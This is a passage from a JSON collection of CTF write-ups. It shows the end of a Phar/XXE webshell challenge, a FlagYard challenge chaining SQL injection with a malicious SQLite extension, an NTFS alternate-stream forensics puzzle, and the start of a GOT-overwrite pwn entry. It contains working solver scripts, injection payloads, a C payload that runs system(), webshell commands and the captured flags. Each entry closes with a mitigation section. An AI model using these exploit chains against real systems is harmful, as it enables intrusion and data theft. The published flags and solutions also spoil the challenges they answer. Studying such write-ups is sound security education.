      "content": "Complete Python automation script that orchestrates the entire exploitation chain:\n1. Generate and compile Phar payload using create_phar.php\n2. Upload malicious Phar as GIF image\n3. Extract upload path from server response\n4. Craft and submit XXE payload with phar:// reference\n5. Execute arbitrary commands through webshell\n\nUsage: python3 solve.py [optional_command]",
      "code": "import re\nimport subprocess\nimport sys\nimport requests\nimport urllib3\n\nurllib3.disable_warnings()\ns = requests.Session()\ns.verify = False\n\nBASE_URL = \"https://9f12ade61851e040.247ctf.com\"\n\nXML_PAYLOAD = \"\"\"\\\n<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"phar://{path}\"> %xxe;]>\n<message>\n  <to>a</to>\n  <from>b</from>\n  <image>c</image>\n</message>\n\"\"\"\n\ndef main():\n    if len(sys.argv) != 2:\n        print(\"[*] Stage 1: Creating Phar payload...\")\n        # Bypass phar.readonly restriction in CLI\n        p = subprocess.run([\"php\", \"-d\", \"phar.readonly=0\", \"create_phar.php\"], capture_output=True, check=True)\n        phar = p.stdout\n        assert len(phar) <= 185, f\"Phar size {len(phar)} exceeds 185 bytes\"\n        print(f\"[+] Phar payload created ({len(phar)} bytes)\")\n        \n        print(\"[*] Stage 2: Uploading malicious Phar as GIF...\")\n        # Upload phar\n        r = s.post(BASE_URL, files={\"image\": (\"test.gif\", phar, \"image/gif\")})\n        m = re.findall(r\"Image uploaded (.*?)!\", r.text)\n        assert m, \"Failed to upload image\"\n        image_path = m[0]\n        print(f\"[+] Phar uploaded to: {image_path}\")\n        \n        print(\"[*] Stage 3: Triggering XXE deserialization...\")\n        # Trigger XXE\n        r = s.post(BASE_URL, data={\"message\": XML_PAYLOAD.format(path=image_path)})\n        assert \"Message stored\" in r.text, \"Failed to upload XML\"\n        print(\"[+] Webshell successfully planted at a.php\")\n    else:\n        cmd = sys.argv[1]\n        print(f\"[*] Executing command: {cmd}\\n\")\n        r = s.get(f\"{BASE_URL}/a.php\", params={\"0\": cmd})\n        m = re.findall(r\"Hey (.*)! Take\", r.text, re.MULTILINE | re.DOTALL)\n        if m:\n            print(\"[+] Output Result:\\n\")\n            print(m[0].strip())\n        else:\n            print(\"[!] No output captured\")\n\nif __name__ == \"__main__\":\n    main()"
    }
  ],
  "terminalOutputs": [
    {
      "command": "python3 solve.py ls",
      "output": "[*] Mengeksekusi perintah: ls\n\n[+] Hasil Output:\n\na.php\nindex.html\nindex.php\nvalid_message.xsd"
    },
    {
      "command": "python3 solve.py 'ls -la /'",
      "output": "[*] Mengeksekusi perintah: ls -la /\n\n[+] Hasil Output:\n\ntotal 0\ndrwxr-xr-x   1 root   root      39 Feb 23 19:43 .\ndrwxr-xr-x   1 root   root      39 Feb 23 19:43 ..\n-rwxr-xr-x   1 root   root       0 Feb 23 19:43 .dockerenv\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 bin\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 boot\ndrwxr-xr-x   1 root   root       0 Dec 26  2018 cgroup\ndr-xr-xr-x   1 root   root       0 Dec 26  2018 cgroup2\ndrwxr-xr-x   5 root   root     360 Feb 23 19:42 dev\ndrwxr-xr-x   1 root   root      66 Feb 23 19:42 etc\ndrwxr-xr-x   1 root   root      19 Dec 26  2018 home\ndrwxr-xr-x   1 root   root      13 Dec 29  2018 lib\ndrwxr-xr-x   2 root   root      37 Dec 29  2018 lib64\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 media\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 mnt\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 opt\ndr-xr-xr-x 117 root   root       0 Dec 26  2018 proc\ndr-xr-x---   2 root   root     160 Feb 23 19:42 root\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 run\ndrwxr-xr-x   1 root   root      32 Dec 29  2018 sbin\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 srv\ndr-xr-xr-x  13 root   root       0 Dec 26  2018 sys\ndrwxrwxrwt   1 root   root      36 Feb 23 19:48 tmp\ndrwxr-xr-x   1 root   root      19 Dec 26  2018 usr\ndrwxr-xr-x   1 root   root      17 Dec 29  2018 var"
    },
    {
      "command": "python3 solve.py \"find / -name '*flag*' 2>/dev/null | grep -E '(^[^/proc]|flag_)'\"",
      "output": "[*] Mengeksekusi perintah: find / -name '*flag*' 2>/dev/null\n\n[+] Hasil Output:\n\n/tmp/flag_0073c38db2a4d3c1.txt"
    },
    {
      "command": "python3 solve.py \"cat /tmp/flag_0073c38db2a4d3c1.txt\"",
      "output": "[*] Mengeksekusi perintah: cat /tmp/flag_0073c38db2a4d3c1.txt\n\n[+] Hasil Output:\n\n247CTF{0073c38db2a4d3c1209caa84ccc5668f}"
    }
  ],
  "flag": "247CTF{0073c38db2a4d3c1209caa84ccc5668f}",
  "lessonsLearned": "**File Upload Validation** - File upload validation must use multiple independent checks - magic bytes alone are insufficient. Always use whitelist MIME types, disable PHP execution in upload directories, and validate file content properly.\n\n**XML Security** - Never enable LIBXML_DTDLOAD flag unless absolutely necessary. XXE vulnerabilities are critical in XML processing with potentially catastrophic impact.\n\n**Deserialization Gadgets** - PHP magic methods (__destruct, __wakeup, __toString) combined with user-controllable object properties create dangerous deserialization gadget chains. Audit all classes with magic methods for exploitation potential.\n\n**Stream Wrappers** - Phar archives with stream wrappers (phar://) automatically trigger deserialization. Treat php:// and phar:// URI schemes as code execution vectors and restrict their use.\n\n**Payload Optimization** - Size-limited payloads can be optimized through algorithm selection (MD5 vs SHA256 signatures) and tight code golf. Always account for creative constraints when building exploits.\n\n**Defense in Depth** - Multi-layer exploitation chains are more likely to bypass defense in depth. Defensive measures must address all layers simultaneously, not just individual components.\n\n**Exposure Prevention** - Command execution endpoints should never be exposed. The webshell a.php demonstrates that even small successful writes lead to complete system compromise."

},
{
  "id": "11",
  "title": "Subscriber",
  "category": "Web",
  "difficulty": "Hard",
  "points": 0,
  "date": "2025-02-24",
  "author": "nata",
  "ctfName": "FlagYard",
  "description": "SQLite extension loading RCE vulnerability. Exploit SQL Injection combined with unrestricted file uploads and SQLite load_extension() to achieve remote code execution.",
  "problemDescription": "A Flask application integrated with SQLite database configured with enable_load_extension(True). The /subscribe endpoint is vulnerable to SQL Injection through the updates_freq parameter. The /feedback endpoint allows file uploads with weak validation. The challenge is to combine both vulnerabilities to achieve RCE and read the flag from the system.",
  "tools": [
    "Python",
    "GCC",
    "SQLite",
    "SQL Injection",
    "Requests"
  ],
  "analysis": "Vulnerability analysis reveals three critical components enabling RCE:\n\n1. **SQL Injection in /subscribe**: The updates_freq parameter uses f-string interpolation without sanitization, allowing arbitrary SQL command injection.\n\n2. **Unrestricted File Upload**: The filter_filename function only checks file extension at the end of the filename with no magic bytes validation. A .so (shared object) file can be uploaded with name shell.jpg and stored in ./uploads/ directory.\n\n3. **SQLite load_extension()**: Database configuration with enable_load_extension(True) allows loading custom shared libraries. When load_extension('path/to/shell.so') is called, C code in the library executes with Flask process privilege.\n\n**Vulnerability Chain**: C extension payload runs automatically during loading (initialization phase). Since Flask is stateless, we leverage this to execute system commands (system()) redirecting output to an accessible file.",
  "solution": [
    {
      "title": "Executive Summary",
      "content": "Subscriber is an advanced web challenge simulating security failures in SQLite database integration with Flask. The vulnerability originates from simple SQL Injection which escalates to Remote Code Execution (RCE) through SQLite extension loading feature. Attackers exploit file validation gaps to upload malicious C libraries (shared objects)."
    },
    {
      "title": "Reconnaissance",
      "content": "The application has several functional endpoints:\n\n- `/`: Home page\n\n- `/subscribe`: Email subscription form using the `updates_freq` parameter\n- `/feedback`: Feedback submission form allowing file uploads\n\n**Database Identification**\n\nThrough error-based and boolean-based probing, the application uses SQLite. The critical finding is the database configuration explicitly allowing extension loading.\n\nDatabase configuration allows extension loading:\n\n```\n================ VULNERABLE CONFIG ================\nconn.enable_load_extension(True)\n================================================\n```\n\n**SQL Injection (Blind Boolean)**\n\nThe `updates_freq` parameter on `/subscribe` endpoint is vulnerable to SQL Injection due to f-string interpolation without sanitization:\n\n```\n================ VULNERABLE QUERY ================\ncursor.execute(f\"SELECT freq FROM updates_freq WHERE option = '{update_option}'\")\n================================================\n```\n\nBasic payload: `' OR 1=1 -- -`"
    },
    {
      "title": "Vulnerability Analysis - Unrestricted File Upload",
      "content": "**Vulnerability #1: Unrestricted File Upload (Extension Bypass)**\n\nThe filter_filename function only checks file extension at the filename end without validating actual content (magic bytes). An attacker can upload a .so (C library) file named shell.jpg, and the application stores it in the ./uploads/ directory."
    },
    {
      "title": "Vulnerability Analysis - SQLite Extension Loading RCE",
      "content": "**Vulnerability #2: SQLite Extension Loading RCE**\n\nThe load_extension() function in SQLite allows loading custom shared libraries. If an attacker can direct this function to an uploaded .so file, the C code inside the library executes with the same privileges as the web application."
    },
    {
      "title": "Exploitation - Malicious C Extension",
      "content": "**Step 1: Creating Malicious SQLite Extension**\n\nCreate a SQLite extension that executes system commands immediately when the library is loaded (initialization phase). This is crucial because Flask is stateless—database connections close after each request.",
      "code": "#include <sqlite3ext.h>\n#include <stdlib.h>\n\nSQLITE_EXTENSION_INIT1\n\nint sqlite3_extension_init(sqlite3 *db, char **pzErrMsg,\n                          const sqlite3_api_routines *pApi) {\n    SQLITE_EXTENSION_INIT2(pApi);\n    \n    // Payload executes automatically when load_extension() is called\n    system(\"cat /app/flag.txt > ./uploads/out.txt\");\n    \n    return SQLITE_OK;\n}\n\n// Compile with: gcc -shared -fPIC -o shell.so shell.c -lsqlite3"
    },
    {
      "title": "Exploitation - Python Solver",
      "content": "**Step 2: Exploit Automation Script**\n\nThis script uploads the payload and triggers execution through SQL Injection in a single workflow.",
      "code": "import requests\nimport time\n\nbase_url = \"http://ukjmwexhynntzwdgyxvsda-0.playat.flagyard.com\"\n\n# 1. Upload malicious extension\nwith open('shell.so', 'rb') as f:\n    requests.post(f\"{base_url}/feedback\", \n                 data={'title': 'Exploit', 'description': 'RCE'}, \n                 files={'file': ('shell.jpg', f, 'application/octet-stream')})\n\n# 2. Trigger RCE via SQL Injection\npayload = \"0' AND load_extension('./uploads/shell.jpg') -- -\"\nrequests.post(f\"{base_url}/subscribe\", \n             data={'email': 'a@b.com', 'updates_freq': payload})\n\n# 3. Read command output\ntime.sleep(1)\nprint(requests.get(f\"{base_url}/uploads/out.txt\").text)"
    },
    {
      "title": "Terminal - Step 1: Directory Exploration",
      "content": "**Step 1: Explore Root Directory** (`ls -la /`)\n\nInitial command to map the system structure.",
      "code": "================ OUTPUT BASH ================\ntotal 76\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 .\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 ..\ndrwxr-xr-x   1   1000    1000 4096 Feb 23 20:34 app\nlrwxrwxrwx   1 nobody nogroup    7 Sep 26  2024 bin -> usr/bin\n...\ndrwxr-xr-x  12 nobody nogroup 4096 Sep 26  2024 usr\ndrwxr-xr-x  11 nobody nogroup 4096 Sep 26  2024 var\n=============================================="
    },
    {
      "title": "Terminal - Step 2: Locate Flag File",
      "content": "**Step 2: Search Application Directory** (`ls -R /app`)\n\nLocate the actual flag file.",
      "code": "================ OUTPUT BASH ================\n/app:\napp.py\nconfig.py\nflag.txt  <-- FLAG FOUND!\ninstance\nrun\nsite.db\nstatic\ntemplates\nuploads\n=============================================="
    },
    {
      "title": "Terminal - Step 3: Extract Flag",
      "content": "**Step 3: Read Flag File** (`cat /app/flag.txt`)\n\nExtract the flag content.",
      "code": "nata@rblx-labs ~/ctf/flagyard/web/13 % python3 solve.py\n[+] Phase 1: Uploading malicious extension...\n[+] Phase 2: Loading extension & Triggering Execution...\n[+] Phase 3: Retrieving output from /uploads/out.txt...\n\n================ OUTPUT BASH ================\nFlagY{d65441712f1d145acbad77b9d78c87be}\n=============================================="
    },
    {
      "title": "Conclusion & Mitigation",
      "content": "The attack succeeds due to a combination of:\n\n**1. Insecure SQL Usage**\n\nNever use string interpolation in SQL queries. Always use parameterized queries with placeholders:\n\n```\n================ SECURE QUERY ================\ncursor.execute(\"SELECT freq FROM updates_freq WHERE option = ?\", (update_option,))\n================================================\n```\n\n**2. Database Misconfiguration**\n\nDo not enable load_extension in production. Keep extension loading disabled and restrict only to trusted administrators in controlled environments:\n\n```\n================ SECURE CONFIG ================\nconn.enable_load_extension(False)  # Default behavior\n================================================\n```\n\n**3. Weak File Validation**\n\nDo not rely solely on filename extensions. Implement multiple validation layers:\n- Validate magic bytes (file signatures)\n- Use whitelist MIME types\n- Disable script execution in upload directories (/uploads/.htaccess)\n- Rename uploaded files with random strings",
      "code": "# Secure file upload validation\nimport mimetypes\nimport os\nfrom pathlib import Path\n\nALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}\nALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif'}\n\ndef validate_upload(file):\n    # 1. Check extension\n    _, ext = os.path.splitext(file.filename)\n    if ext.lower()[1:] not in ALLOWED_EXTENSIONS:\n        raise ValueError(\"Invalid file extension\")\n    \n    # 2. Check MIME type\n    mime, _ = mimetypes.guess_type(file.filename)\n    if mime not in ALLOWED_MIMES:\n        raise ValueError(\"Invalid MIME type\")\n    \n    # 3. Check magic bytes\n    import magic\n    file_type = magic.from_buffer(file.read(1024), mime=True)\n    file.seek(0)  # Reset file pointer\n    if file_type not in ALLOWED_MIMES:\n        raise ValueError(\"Magic bytes do not match expected format\")\n    \n    return True"
    }
  ],
  "terminalOutputs": [
    {
      "command": "ls -la /",
      "output": "total 76\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 .\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 ..\ndrwxr-xr-x   1   1000    1000 4096 Feb 23 20:34 app\nlrwxrwxrwx   1 nobody nogroup    7 Sep 26  2024 bin -> usr/bin\ndrwxr-xr-x   2 nobody nogroup 4096 Sep 26  2024 boot\ndrwxr-xr-x   5 nobody nogroup 4096 Feb 23 19:42 dev\ndrwxr-xr-x   1 nobody nogroup   66 Feb 23 19:42 etc\ndrwxr-xr-x   1 nobody nogroup   19 Dec 26  2018 home\nlrwxrwxrwx   1 nobody nogroup    7 Sep 26  2024 lib -> usr/lib\nlrwxrwxrwx   1 nobody nogroup    9 Sep 26  2024 lib64 -> usr/lib64\ndrwxr-xr-x   2 nobody nogroup    6 Dec 29  2018 media\ndrwxr-xr-x   2 nobody nogroup    6 Dec 29  2018 mnt\ndrwxr-xr-x   2 nobody nogroup    6 Dec 29  2018 opt\ndr-xr-xr-x 117 root   root       0 Dec 26  2018 proc\ndr-xr-x---   2 root   root     160 Feb 23 19:42 root\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 run\ndrwxr-xr-x   1 root   root      32 Dec 29  2018 sbin\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 srv\ndr-xr-xr-x  13 root   root       0 Dec 26  2018 sys\ndrwxrwxrwt   1 root   root      36 Feb 23 19:48 tmp\ndrwxr-xr-x   1 root   root      19 Dec 26  2018 usr\ndrwxr-xr-x   1 root   root      17 Dec 29  2018 var"
    },
    {
      "command": "ls -R /app",
      "output": "/app:\napp.py\nconfig.py\nflag.txt\ninstance\nrun\nsite.db\nstatic\ntemplates\nuploads"
    },
    {
      "command": "python3 solve.py",
      "output": "[+] Phase 1: Uploading malicious extension...\n[+] Phase 2: Loading extension & Triggering Execution...\n[+] Phase 3: Retrieving output from /uploads/out.txt...\n\nFlagY{d65441712f1d145acbad77b9d78c87be}"
    }
  ],
  "flag": "FlagY{d65441712f1d145acbad77b9d78c87be}",
  "lessonsLearned": "**SQL Injection Prevention** - Never use string interpolation in SQL queries. Always use prepared statements with parameter binding to prevent SQL Injection attacks. Treated untrusted input as data, not code.\n\n**Database Extension Security** - Database extension features like load_extension() must be disabled in production environments. Restrict extension loading only to trusted administrators in controlled environments with proper auditing.\n\n**File Upload Validation** - File upload validation must not depend on a single defense layer. Implement multiple validation layers: extension whitelist, magic bytes verification, MIME type checking, and disable script execution in upload directories with proper server configuration.\n\n**Principle of Least Privilege** - Enable only the functionality required and disable everything unnecessary. SQLite enable_load_extension should be disabled by default in production deployments. Review all enabled features regularly.\n\n**Stateless Application Design** - Even though Flask is stateless, side effects from library loading can persist through the file system. Audit all initialization code in loaded extensions for unintended consequences and security implications.\n\n**Defense in Depth** - Multiple individually minor vulnerabilities can combine to create critical RCE. Secure development requires comprehensive security testing across all components and threat modeling of vulnerability chains."

}, {
  "id": "12",
  "title": "Zippy",
  "category": "Forensics",
  "difficulty": "Medium",
  "points": 0,
  "date": "2026-02-24",
  "author": "nata",
  "ctfName": "Vulnby CTF",
  "description": "A forensic challenge leveraging NTFS Alternate Data Streams (ADS) as a hiding mechanism for archive passwords. The challenge combines archive cryptography (AES-256), file format analysis, and cross-OS filesystem limitations.",
  "problemDescription": "Challenge riddle: 'How much data is lost during compression? Dont keep the lock and key at the same place'. Two encrypted archive files are provided: locked_files.zip (AES-256 encrypted) and locked_files.rar (RAR5 format). The password for the ZIP archive is intentionally hidden in a Windows NTFS Alternate Data Stream (ADS) within the RAR file, creating a cross-OS filesystem challenge when working on Linux systems.",
  "tools": [
    "7z (p7zip-rar plugin)",
    "RAR5 format",
    "NTFS Alternate Data Streams",
    "Linux Ext4",
    "AES-256 encryption",
    "Archive analysis",
    "Hex dump utilities"
  ],
  "analysis": "The challenge presents a sophisticated exploitation of Windows NTFS features combined with cross-operating system filesystem limitations to create a multi-layered forensic puzzle.\n\nAlternate Data Streams (ADS) are a Windows NTFS feature that allow multiple data streams to be attached to a single file. While primarily designed for storing metadata like file icons and zone information, they can be exploited to hide sensitive data from standard file managers and casual inspection. An ADS is not visible in normal directory listings and survives on NTFS systems, but gets lost when files are transferred to non-NTFS filesystems like Linux Ext4.\n\nThe challenge exploits two critical limitations: First, most Linux tools cannot properly extract ADS from RAR archives because the Linux filesystem has no concept of alternate streams. Standard extraction attempts fail, creating the illusion that the hidden data is inaccessible. Second, solvers are misled by the riddle about 'how much data is lost during compression' into pursuing false paths like compression ratio analysis, bruteforce attacks, or known-plaintext attacks instead of investigating the archive metadata.\n\nThe breakthrough comes from using 7z with proper RAR5 support, which can detect and report ADS presence through fields like 'Alternate Streams: 1' and 'Alternate Streams Size: 32' in its detailed listing. This reveals that data exists beyond the visible file. Once recognized, specialized tools can extract the ADS content despite Linux filesystem limitations, revealing the MD5 hash password hidden in the stream.",
  "solution": [
    {
      "title": "Phase 1: Reconnaissance & Discovery",
      "content": "Start by examining both provided files to understand their structure and encryption. Use 7z to list the contents of both the ZIP and RAR archives without extracting. The ZIP file contains an AES-256 encrypted flag.txt, while the RAR file contains the ZIP file itself plus a mysterious entry labeled 'Alternate Streams: 1' with a 32-byte size.\n\nThis 'Alternate Streams' field is the critical breakthrough indicator. It's an anomaly that doesn't appear in standard Windows file managers and requires specialized archive tools to detect. Alternate Data Streams (ADS) are a Windows NTFS feature that allow multiple data streams to be attached to a single file, often used for storing metadata but exploitable for hiding data.\n\nThe riddle 'How much data is lost during compression?' initially seems to point toward compression ratio analysis, but the real meaning becomes clear after discovering the ADS: data is 'lost' when using incompatible extraction tools that can't handle hidden streams across different operating systems.",
      "code": "Key observations from archive listing:\n\nZIP File Analysis:\n- Type: standard zip\n- Size: 203 bytes\n- Contains: flag.txt (37 bytes, AES-256 encrypted)\n\nRAR File Analysis:\n- Type: RAR5 format\n- Contains: locked_files.zip (203 bytes, compressed to 194)\n- CRITICAL: Alternate Streams: 1\n- CRITICAL: Alternate Streams Size: 32 bytes\n\nThe 32-byte alternate stream is suspicious and requires investigation with specialized tools that support RAR5 format."
    },
    {
      "title": "Phase 2: The Trap (False Path)",
      "content": "After discovering the ADS stream indicator, solvers naturally assume the hidden stream contains the password. The stream name 'forgotpassword' (discovered via 7z detailed listing) seems like an obvious password hint. However, attempting to extract it using standard Linux tools fails because Linux Ext4 filesystem has no concept of alternate data streams.\n\nWhen tools encounter ADS in RAR metadata, they either ignore the stream entirely, create empty placeholder files, or throw unsupported format errors. This leads to frustration and false hypotheses like trying 'forgotpassword' itself as the password, or bruteforcing with dictionary attacks.\n\nAll of these wrong approaches fail. The real solution requires understanding that the Linux filesystem limitation is intentional misdirection, and that specialized tools with explicit RAR5 support are needed to forcefully extract all data despite OS limitations."
    },
    {
      "title": "Phase 3: Breaking Through OS Limitations",
      "content": "The key is using 7z with the p7zip-rar plugin, which provides full RAR5 format support. This tool can extract ADS metadata even though the Linux filesystem cannot natively store streams. Install the p7zip-rar package to gain RAR5 support.\n\nWhen extracting with 7z, the tool handles the filesystem incompatibility by using special colon notation for ADS filenames. Even though Linux Ext4 can't natively store alternate streams, the extraction process preserves the data and makes it accessible through the shell.\n\nOnce extracted, the ADS content reveals itself as a 32-byte MD5 hash. This hash serves as the password for the AES-256 encrypted ZIP file. The design is elegant: the password is hidden not through complexity or obscurity, but through exploitation of cross-OS filesystem differences that most solvers don't think to investigate.",
      "code": "Extraction and stream access:\n\n1. Install RAR5 support:\n   sudo apt-get install p7zip-rar\n\n2. Extract from RAR (7z handles ADS automatically):\n   7z x locked_files.rar\n   - Creates locked_files.zip file\n   - Internally preserves ADS data\n   - Output shows: Alternate Streams: 1, Alternate Streams Size: 32\n\n3. Access the hidden ADS data:\n   cat \"locked_files.zip:forgotpassword\"\n   - ADS is accessed via colon notation\n   - Shell interprets the path and returns stream data\n   - Result: 32-byte MD5 hash (the password!)\n\n4. The hash becomes the password for decrypting the ZIP archive."
    },
    {
      "title": "Phase 4: Final Exploitation",
      "content": "With the password extracted from the hidden ADS stream, decrypt and extract the actual flag from the ZIP archive. Use 7z with the -p flag to specify the password (the MD5 hash from the ADS). The extraction process will prompt for confirmation when replacing existing files.\n\nAfter successful decryption, the flag.txt file is extracted with its full 37 bytes of data intact. Reading the extracted flag completes the challenge. The entire exploitation chain demonstrates how combining multiple security layers (AES-256 encryption, RAR5 format, NTFS ADS metadata, and OS filesystem differences) creates a formidable obstacle for most standard forensic approaches - yet specialized knowledge of archive formats and filesystem capabilities reveals the solution.",
      "code": "Password-protected extraction:\n\n1. Extract ZIP with password (MD5 hash from ADS):\n   7z x locked_files.zip -p8d364896e034aabe3fc9fd2e05fb1cbe\n\n2. Tool output confirms:\n   - Archive: locked_files.zip (203 bytes)\n   - Encrypted file: flag.txt (37 bytes)\n   - Extraction: Success (Everything is Ok)\n\n3. Read the extracted flag:\n   cat flag.txt\n\n4. Result: VBD{c99a11a53a3748269e3f86d7ac38df11}\n\nComplete exploitation chain successful!"
    },
    {
      "title": "Technical Deep Dive: NTFS ADS Exploitation",
      "content": "Alternate Data Streams are a powerful hiding mechanism because they exist largely outside the awareness of most users and tools. They're hidden by default in Windows Explorer, invisible in standard file listings, survive file copies within NTFS systems (but disappear on non-NTFS transfers), and are difficult to detect without specialized forensic tools.\n\nRAR5 format explicitly preserves NTFS metadata including ADS information in its headers. This means archive tools like 7z can report ADS presence through fields like 'Alternate Streams: 1' and 'Alternate Streams Size', creating visible discrepancies between reported and actual file sizes. This is the key to detection.\n\nThe challenge of cross-OS compatibility emerges when archives created on Windows are analyzed on Linux. Linux Ext4 filesystem has no concept of alternate streams, so extraction tools must use workarounds like colon notation to represent ADS filenames. 7z handles this by storing and accessing ADS with special syntax, preserving the data even though the filesystem can't natively store it.",
      "code": "Filesystem comparison:\n\nNTFS (Windows):\n- Native ADS support\n- Transparent storage and access\n- ADS survives file copies within NTFS\n\nExt4 (Linux):\n- No native ADS support\n- Can extract ADS metadata from RAR archives\n- Cannot permanently store ADS on Ext4\n- Uses special colon notation for access: filename:streamname\n\nRAR5 Format Capabilities:\n- Stores complete NTFS metadata in archive headers\n- Preserves ADS information for later extraction\n- 7z reports ADS presence in detailed listing\n- Enables cross-platform ADS detection via tool output\n\n7z ADS Handling Strategy:\n- Detects ADS in RAR archive metadata\n- Extracts ADS data during archive extraction\n- Uses colon notation for filesystem access\n- Preserves data without creating separate file entries"
    }
  ],
  "terminalOutputs": [
    {
      "command": "7z l locked_files.rar",
      "output": "7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20\n 64-bit locale=C.UTF-8 Threads:12 OPEN_MAX:10240\n\nScanning the drive for archives:\n1 file, 357 bytes (1 KiB)\n\nPath = locked_files.rar\nType = Rar5\n   Date      Time    Attr         Size   Compressed  Name\n------------------- ----- ------------ ------------  ------------------------\n2026-02-24 22:52:38 ....A          203          194  locked_files.zip\n------------------- ----- ------------ ------------  ------------------------\n2026-02-24 22:52:38                203          194  1 files\n2026-02-24 22:52:38                 32           39  1 alternate streams\n2026-02-24 22:52:38                235          233  2 streams"
    },
    {
      "command": "7z x locked_files.rar",
      "output": "7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20\n 64-bit locale=C.UTF-8 Threads:12 OPEN_MAX:10240\n\nScanning the drive for archives:\n1 file, 357 bytes (1 KiB)\n\nExtracting archive: locked_files.rar\n--\nPath = locked_files.rar\nType = Rar5\nPhysical Size = 357\nSolid = -\nBlocks = 2\nEncrypted = -\nMultivolume = -\nVolumes = 1\n\nWould you like to replace the existing file:\n  Path:     ./locked_files.zip\n  Size:     203 bytes (1 KiB)\n  Modified: 2026-02-24 22:52:38\nwith the file from archive:\n  Path:     locked_files.zip\n  Size:     203 bytes (1 KiB)\n  Modified: 2026-02-24 22:52:38\n? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? y\n\nEverything is Ok\n\nFiles: 1\nAlternate Streams: 1\nAlternate Streams Size: 32\nSize:       203\nCompressed: 357"
    },
    {
      "command": "cat \"locked_files.zip:forgotpassword\"",
      "output": "8d364896e034aabe3fc9fd2e05fb1cbe"
    },
    {
      "command": "7z x locked_files.zip -p8d364896e034aabe3fc9fd2e05fb1cbe",
      "output": "7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20\n 64-bit locale=C.UTF-8 Threads:12 OPEN_MAX:10240\n\nScanning the drive for archives:\n1 file, 203 bytes (1 KiB)\n\nExtracting archive: locked_files.zip\n--\nPath = locked_files.zip\nType = zip\nPhysical Size = 203\n\nWould you like to replace the existing file:\n  Path:     ./flag.txt\n  Size:     0 bytes\n  Modified: 2026-02-24 20:52:38\nwith the file from archive:\n  Path:     flag.txt\n  Size:     37 bytes (1 KiB)\n  Modified: 2026-02-24 20:52:38\n? (Y)es / (N)o / (N)o to All / (Y)es to All / Auto Rename / (Q)uit? y\n\nEverything is Ok\n\nSize:       37\nCompressed: 203"
    },
    {
      "command": "cat flag.txt",
      "output": "VBD{c99a11a53a3748269e3f86d7ac38df11}"
    }
  ],
  "flag": "VBD{c99a11a53a3748269e3f86d7ac38df11}",
  "lessonsLearned": "**NTFS Alternate Data Streams as a Security Concern** - While ADS are useful for metadata, they represent a significant security risk when not properly understood. Data can be hidden in plain sight without triggering standard file analysis tools. Always examine archive metadata closely, especially size discrepancies and tool-specific information fields.\n\n**Cross-OS Filesystem Compatibility** - File formats and filesystem features do not translate across operating systems. Archives created on Windows with NTFS-specific metadata may behave unexpectedly on Linux systems. Understanding these limitations is crucial for forensic analysis and incident response.\n\n**Archive Tool Capabilities Matter** - Not all archive extraction tools are equal. Standard unrar may fail where 7z with p7zip-rar succeeds. Always verify your tools support the specific archive format VERSION and include native metadata handling. The choice of tool can be the difference between finding evidence and missing it.\n\n**Riddle Misdirection** - CTF riddles often point to the vulnerability category but can misdirect the approach. 'How much data is lost' initially suggests compression analysis rather than hidden data discovery. Critical thinking about multiple interpretations of hints is necessary.\n\n**Metadata Analysis** - The 'Alternate Streams: 1' field in 7z output was the breakthrough indicator. Forensic analysis requires attention to every detail of tool output, including fields that may seem unimportant at first glance. Extract and examine all metadata.\n\n**Defense in Depth for Data Protection** - The challenge combines multiple security layers: archive encryption (AES-256), password isolation (ADS), format complexity (RAR5), and OS-level hiding. While this creates challenge difficulty, it demonstrates why strong data protection requires multiple mechanisms working together."

}, {
  "id": "13",
  "title": "GOT me",
  "category": "Pwn",
  "difficulty": "Easy",
  "points": 0,
  "date": "2026-02-25",
  "author": "nata",
  "ctfName": "Flagyard",
  "description": "Binary exploitation via Format String vulnerability to achieve arbitrary write on Global Offset Table (GOT). Exploit circumvents modern Intel CET (Control-flow Enforcement Technology) protections by carefully targeting GOT entries while respecting indirect branch validation.",
  "problemDescription": "A 64-bit ELF binary with Partial RELRO and disabled stack canary. The binary implements a custom function containing a Format String vulnerability in a printf() call without format specifier validation. Goal: Exploit Format String to overwrite the GOT entry of puts() with the address of win() function, bypassing Intel CET indirect branch tracking (IBT) by respecting endbr64 instruction requirements.",
  "tools": [
    "pwntools",
    "radare2",
    "checksec",
    "objdump",
    "Format String exploitation",
    "Intel CET (SHSTK/IBT)"
  ],
  "analysis": "Security analysis reveals a combination of modern protections and exploitable weaknesses:\n\n**Binary Protections:**\n- Partial RELRO: GOT is writable, enabling arbitrary write via pointer manipulation\n- No Stack Canary: Stack overflow protection absent\n- NX Enabled: Code execution requires ROP or code injection\n- SHSTK & IBT (Intel CET): Indirect branches must land on endbr64 instructions; bypassing requires landing exactly at valid entry points\n- No PIE: Function addresses are static, simplifying target location\n\n**Vulnerability Analysis:**\n1. **Format String**: printf() called directly on user input without format specifier\n2. **Input Size**: fgets(buffer, 128) allows up to 127 bytes payload\n3. **Offset Discovery**: User input reaches printf at offset 6 in argument stack\n\n**Exploitation Challenge**: Must perform 3 separate 2-byte writes (using %hn) to completely overwrite GOT entry:\n- GOT+0: 0x11b6 (lower bytes of win_addr)\n- GOT+2: 0x0040 (middle bytes of win_addr)\n- GOT+4: 0x0000 (upper bytes to clear libc address)\n\n**Intel CET Bypass**: By landing exactly at 0x4011b6 (start of win function), the endbr64 instruction is respected, bypassing IBT validation.",
  "solution": [
    {
      "title": "Phase 1: Reconnaissance & Protection Analysis",
